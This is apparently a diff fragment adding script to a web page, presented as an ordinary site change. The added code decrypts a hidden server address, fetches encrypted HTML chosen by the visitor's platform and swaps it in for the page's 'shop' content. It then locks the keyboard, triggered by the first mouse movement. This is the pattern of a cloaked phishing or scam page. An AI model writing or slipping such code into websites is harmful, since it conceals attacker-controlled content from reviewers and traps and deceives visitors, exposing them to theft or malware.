+    const ENC_DATA_ORIGIN = "U2FsdGVkX185SIW5dTnVPwHiFQ8oiX7AnMX5CND5ORpjj09Nhlo+sA5NC5FQ2qsF";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-  <script src="js/main.js"></script>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
